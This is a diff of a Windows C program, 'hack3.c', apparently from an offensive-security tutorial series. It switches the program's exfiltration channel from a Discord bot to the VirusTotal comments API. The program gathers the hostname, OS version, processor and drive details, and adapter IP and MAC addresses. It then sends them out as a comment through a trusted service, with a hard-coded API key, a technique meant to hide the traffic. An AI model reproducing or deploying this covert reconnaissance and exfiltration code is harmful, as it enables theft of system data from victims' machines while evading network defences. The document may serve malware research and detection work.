@@ -1,6 +1,6 @@
 /*
  * hack3.c
- * sending systeminfo via legit URL. Discord Bot API
+ * sending systeminfo via legit URL. VirusTotal API
  * author @cocomelonc
 */
 #include <stdio.h>
@@ -10,78 +10,65 @@
 #include <winhttp.h>
 #include <iphlpapi.h>
 
-#define DISCORD_BOT_TOKEN "your discord bot token" // replace with your actual bot token
-#define DISCORD_CHANNEL_ID "your discord channel id" // replace with the channel ID where you want to send the message
+#define VT_API_KEY "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42"
+#define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"
 
-// function to send a message to discord using the discord Bot API
-int sendToDiscord(const char* message) {
+// send data to VirusTotal using winhttp
+int sendToVT(const char* comment) {
   HINTERNET hSession = NULL;
   HINTERNET hConnect = NULL;
-  HINTERNET hRequest = NULL;
 
   hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
   if (hSession == NULL) {
-    fprintf(stderr, "WinHttpOpen. error: %d has occurred.\n", GetLastError());
+    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
     return 1;
   }
 
-  hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+  hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
   if (hConnect == NULL) {
     fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hSession);
-    return 1;
   }
 
-  hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v10/channels/" DISCORD_CHANNEL_ID "/messages", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID "/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (hRequest == NULL) {
     fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    return 1;
   }
 
-  // set headers
-  if (!WinHttpAddRequestHeaders(hRequest, L"Authorization: Bot " DISCORD_BOT_TOKEN "\r\nContent-Type: application/json\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD)) {
-    fprintf(stderr, "WinHttpAddRequestHeaders. error %d has occurred.\n", GetLastError());
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    return 1;
-  }
-
-  // construct JSON payload
+  // construct the request body
   char json_body[1024];
-  snprintf(json_body, sizeof(json_body), "{\"content\": \"%s\"}", message);
+  snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}", comment);
 
-  // send the request
-  if (!WinHttpSendRequest(hRequest, NULL, -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
-    fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
+  // set the headers
+  if (!WinHttpSendRequest(hRequest, L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json", -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
+    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     return 1;
   }
 
-  // receive response
   BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
   if (!hResponse) {
-    fprintf(stderr, "WinHttpReceiveResponse. error %d has occurred.\n", GetLastError());
+    fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
   }
 
   DWORD code = 0;
   DWORD codeS = sizeof(code);
   if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeS, WINHTTP_NO_HEADER_INDEX)) {
     if (code == 200) {
-      printf("message sent successfully to discord.\n");
+      printf("comment posted successfully.\n");
     } else {
-      printf("failed to send message to discord. HTTP status code: %d\n", code);
+      printf("failed to post comment. HTTP Status Code: %d\n", code);
     }
   } else {
     DWORD error = GetLastError();
     LPSTR buffer = NULL;
     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL, error, 0, (LPSTR)&buffer, 0, NULL);
-    printf("unknown error: %s\n", buffer);
+    printf("WTF? unknown error: %s\n", buffer);
     LocalFree(buffer);
   }
 
@@ -89,39 +76,42 @@ int sendToDiscord(const char* message) {
   WinHttpCloseHandle(hRequest);
   WinHttpCloseHandle(hSession);
 
+  printf("successfully send info via VT API :)\n");
   return 0;
 }
 
+// get systeminfo and send as comment via VT API logic
 int main(int argc, char* argv[]) {
-  // test message
-  const char* message = "meow-meow";
-  sendToDiscord(message);
+
+  // test posting comment
+//   const char* comment = "meow-meow";
+//   sendToVT(comment);
 
   char systemInfo[4096];
 
-  // get host name
+  // Get host name
   CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
   DWORD size = sizeof(hostName) / sizeof(hostName[0]);
-  GetComputerNameA(hostName, &size);
+  GetComputerNameA(hostName, &size);  // Use GetComputerNameA for CHAR
 
-  // get OS version
+  // Get OS version
   OSVERSIONINFO osVersion;
   osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&osVersion);
 
-  // get system information
+  // Get system information
   SYSTEM_INFO sysInfo;
   GetSystemInfo(&sysInfo);
 
-  // get logical drive information
+  // Get logical drive information
   DWORD drives = GetLogicalDrives();
 
-  // get IP address
+  // Get IP address
   IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
   DWORD adapterInfoSize = sizeof(adapterInfo);
   if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
     printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
-    return 1;
+    return false;
   }
 
   snprintf(systemInfo, sizeof(systemInfo),
@@ -136,7 +126,7 @@ int main(int argc, char* argv[]) {
     sysInfo.dwNumberOfProcessors,
     drives);
 
-  // add IP address information
+  // Add IP address information
   for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
     snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
     "Adapter Name: %s, "
@@ -150,7 +140,13 @@ int main(int argc, char* argv[]) {
     adapter->Address[3], adapter->Address[4], adapter->Address[5]);
   }
 
-  // send system info to discord
-  sendToDiscord(systemInfo);
+  int result = sendToVT(systemInfo);
+
+  if (result == 0) {
+    printf("ok =^..^=\n");
+  } else {
+    printf("nok <3()~\n");
+  }
+
   return 0;
 }
